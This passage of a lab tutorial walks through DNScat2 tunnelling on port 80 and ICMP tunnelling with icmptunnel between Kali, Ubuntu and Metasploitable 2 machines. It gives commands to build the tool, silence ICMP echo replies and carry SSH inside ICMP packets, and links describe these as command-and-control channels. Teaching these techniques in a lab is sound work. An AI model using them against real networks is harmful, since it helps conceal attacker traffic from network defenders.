
```
ssh msfadmin@127.0.0.1 -p 8888
```

![](https://i0.wp.com/1.bp.blogspot.com/-NuqyW-wyrm4/YBhIKtu6b2I/AAAAAAAAtUs/XDKhOQ6LVv459mUpRIA0UGf6e3v51jcaACLcBGAsYHQ/s16000/106.png?w=640&ssl=1)

**DNScat2 Tunnelling on port 80**

We can perform the same using port 80.

```
listen 127.0.0.1:9999 192.168.226.129:80
```

![](https://i0.wp.com/1.bp.blogspot.com/-Oflh8tnv7dE/YBhISlCPIqI/AAAAAAAAtU0/MrLCD-_K2TgMFwDr9aWt6FOECKbMK5CFACLcBGAsYHQ/s16000/107.png?w=640&ssl=1)

When you open the web browser in the Kali Linux machine and mention the URL of the Metasploitable 2 machines, you will see that the connection was successfully established between the Kali Linux and the Metasploitable 2 using Ubuntu.

![](https://i0.wp.com/1.bp.blogspot.com/-4EYLdQPl0yA/YBhIYYmnjTI/AAAAAAAAtU8/F5TvekM6UWoI1ZRgK6f_yXDOW7IQmRtHQCLcBGAsYHQ/s16000/108.png?w=640&ssl=1)

The same can be done in the windows system Follow this link **[here](https://downloads.skullsecurity.org/dnscat2/)** to download a suitable dnscat2 client for your system of windows. To get a detailed explanation on DNScat2 you can read **[here](https://www.hackingarticles.in/dnscat2-application-layer-cc/)**.

### **ICMP Tunneling**

The main aim of the ICMP tunnel is to send TCP connection where an SSH session will be used in an encapsulated form of ICMP packets. Let’s first configure the ICMP tunnel on the Ubuntu machine. You can read a detailed article from [**here**](https://www.hackingarticles.in/command-and-control-tunnelling-via-icmp/).

We will first download and install icmptunnel on the server-side and compile the file by unpacking its components.

```
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel
make
```

Then we will disable ICMP echo reply on both the Ubuntu and the Kali Linux. This halts the kernel from responding to any of its packets.

```
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
./icmptunnel -s
Ctrl+z
bg
```

![](https://i0.wp.com/1.bp.blogspot.com/-adkRdLLcG9k/YBhIfzMdOXI/AAAAAAAAtVE/gOFfyOEHEQ03cW8Z-DIs-4pIP2dJxZOOQCLcBGAsYHQ/s16000/81.png?w=640&ssl=1)

Now let’s start the ICMP tunnel on Ubuntu on server mode and assign it a new IP address for tunnelling.

```
/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0
ifconfig
```

![](https://i0.wp.com/1.bp.blogspot.com/-HUpoTLoSLIE/YBhImCsbV6I/AAAAAAAAtVM/McLd_9fVSUgfA9MTdwCdmsu4JSKvxdBVQCLcBGAsYHQ/s16000/82.png?w=640&ssl=1)

Now let’s install and set up ICMP tunnel on the client-side i.e Kali Linux as we did in Ubuntu.

```
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel
make
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
./icmptunnel 192.168.1.108
Ctrl+z
bg
/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
ifconfig
```

**![](https://i0.wp.com/1.bp.blogspot.com/-Pva3K_G4Wq0/YBhIthYoVzI/AAAAAAAAtVU/ZeIhErpdHIgm31qGBdcM0FvlngVLdG3DACLcBGAsYHQ/s16000/83.png?w=640&ssl=1)**

 Once the other IP address for tunnelling is created in the Kali machine, let’s connect over SSH with the credentials of the server-side with IP address 10.0.0.1.

```
ssh raj@10.0.0.1
```

![](https://i0.wp.com/1.bp.blogspot.com/-JeMJzbrR72Q/YBhIz9vyOwI/AAAAAAAAtVY/44NtrIx7fHEuzxEhMdPAp2Y9VCkL5lApgCLcBGAsYHQ/s16000/84.png?w=640&ssl=1)

When you open Wireshark and capture the packets, you only see that all the packets of SSH which is a TCP protocol is being transported on the ICMP protocol. 

![](https://i0.wp.com/1.bp.blogspot.com/-X_eY8J4c1hc/YBhI5L8qNoI/AAAAAAAAtVg/654D1svBJt8jHRg_J3Yz2lYy5a4wYfdswCLcBGAsYHQ/s16000/85.png?w=640&ssl=1)

### **Conclusion**

Therefore in this article, we have seen the effectiveness of various port forwarding and Tunnelling methods to provide a secure and encrypted connection.

**Author:** Jeenali Kothari is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her on **[Here](https://www.linkedin.com/in/jeenali-kothari)**